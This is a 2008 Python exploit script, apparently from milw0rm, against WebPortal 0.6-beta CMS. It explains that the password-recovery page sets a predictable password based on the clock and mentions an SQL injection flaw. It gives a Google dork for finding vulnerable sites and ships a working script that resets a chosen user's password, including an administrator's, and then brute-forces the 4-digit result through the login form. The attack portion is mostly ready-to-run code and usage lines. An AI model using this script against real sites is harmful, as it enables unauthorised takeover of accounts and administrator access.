#!/usr/bin/python
#=================================================================================================#
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                    This is a Public Exploit.                                    #
#				   Date: 04/01/2008 [dd,mm,yyyy]                                  #
#                                                                                                 #
#                                      !!!Happy New Year!!!                                       #
#                                                                                                 #
#=================================================================================================#
#               WebPortal-0.6-beta Cms And Maybe Lower Remote Password Change Exploit             #
#                                                                                                 #
#                                       Vendor:   webportal.ivanoculmine.com                      #
#                                     Severity:   Highest                                         #
#                                       Author:   The:Paradox                                     #
#=================================================================================================#
#                             This exploit works with Magic Quotes = On                           #
#=================================================================================================#
#                                       Proud To Be Italian.                                      #
#=================================================================================================#
"""
                                            Related Codes:
                                         actions.php; line 14:

elseif ($_GET["action"] == "lostpass") {
  $newpass = date("is").substr($user, 1, 2);

  $result = db_query ("SELECT * FROM ".$prefix."users WHERE uname='".$_POST["user_name"]."';");
  if (db_num_rows($result) > 0) {
    $utente = db_fetch_array ($result);
    db_query ("UPDATE ".$prefix."users SET pass='".md5($newpass)."' WHERE id='".$utente["id"]."';");

"""
#=================================================================================================#
# Proof Of Concept / Bug Explanation:                                                             #
#                                                                                                 #
# This vulnerability is in actions.php and make us able to change the password of a victim user.  #
# The page is a "Password Recovery Tool", that sends a new generated password to user's email.    #
# It does an Update query (after a vulnerable SQL injection mq = OFF xD) setting as "pass"        #
# the $newpass variable. Let's look the code.                                                     #
#                                                                                                 #
# $newpass = date("is").substr($user, 1, 2);                                                      #
#                                                                                                 #
# The newpassword is simply the date (minute+seconds) and the var $user taken trought             #
# register_globals (we can let it empty).                                                         #
# So look at your clock, recover the password, and get administator rights ! =D                   #
#                                                                                                 #
# If get the exactly server date is a problem for you, i have coded a little bruteforcer          #
# (the new password is a 4 number sequence).                                                      #
#                                                                                                 #
#=================================================================================================#
# Post Request to "Recover Password" :                                                            #
#                                                                                                 #
# POST /webportal-0.6-beta/actions.php?action=lostpass user_name=[UserName]                       #
#                                                                                                 #
#=================================================================================================#
# WebPortal cms is a very bugged platform. Some pages and functions don't work with the server    #
# configuration Register_globals = Off , A LOT of sql injections with Magic Quotes = Off,         #
# Full path disclosoures ecc.                                                                     #
# Whatever this one is the most critical ('cause works with Mq=ON).                               #
# Maybe I'll public a sql injection mq=Off.                                                       #
#=================================================================================================#
# Google Dork=> Realizzato utilizzando Web Portal                                                 #
#=================================================================================================#
# Use this at your own risk. You are responsible for your own deeds.                              #
#=================================================================================================#
#                                      Python Exploit Starts                                      #
#=================================================================================================#
import httplib, urllib, sys
from string import replace
print "\n################################################"
print "      WebPortal-0.6-beta Cms And Maybe Lower    "
print "          Remote Password Change Exploit        "
print "                 Date Bruteforcer               "
print "                                                "
print "            Discovered By The:Paradox           "
print "                                                "
print " Usage:                                         "
print " python %s [Target] [Path] [Username]           " % (sys.argv[0])
print "                                                "
print " Example:                                       "
print " python %s 127.0.0.1 /WebPortal/ Admin          " % (sys.argv[0])
print " python %s www.host.com / Admin                 " % (sys.argv[0])
print "                                                "
print "                                                "
print "################################################\n"
if len(sys.argv)<=3:	sys.exit()
else:   print "[.]Exploit Starting."
port = "80"
target = sys.argv[1]
path = sys.argv[2]
username = sys.argv[3]


#Resetting Password
conn = httplib.HTTPConnection(target,port)
conn.request("POST", path + "actions.php?action=lostpass", urllib.urlencode({'user_name': username}), {"Accept": "text/plain","Content-Type": "application/x-www-form-urlencoded"})
response = conn.getresponse()
print "[.]Resetting Password -->",response.status, response.reason
conn.close()
#If 404 error: die.
if response.status == 404:
	sys.exit("[-]Unable to reset Password. Failed, Exiting.")

#Let's Brute.
print "[.]Bruteforcer Starts. This may take long time."
for i in range(10000,19999):

		conn = httplib.HTTPConnection(target,port)
		conn.request("POST", path + "actions.php", urllib.urlencode({'uname': username,'pass': replace(str(i), "1", "", 1),"action" : "login"}), {"Accept": "text/plain","Content-Type": "application/x-www-form-urlencoded"})
		response = conn.getresponse()
		header = response.getheader("location")

		if header.find("index.php?error=not_logged") == -1:
			sys.exit("\n\n[+]Gotcha! Password is: " + replace(str(i), "1", "", 1) + "\n\n-=Paradox Got This One=-\n")

print "[-]Not Found. Exploit Failed."

# milw0rm.com [2008-01-04]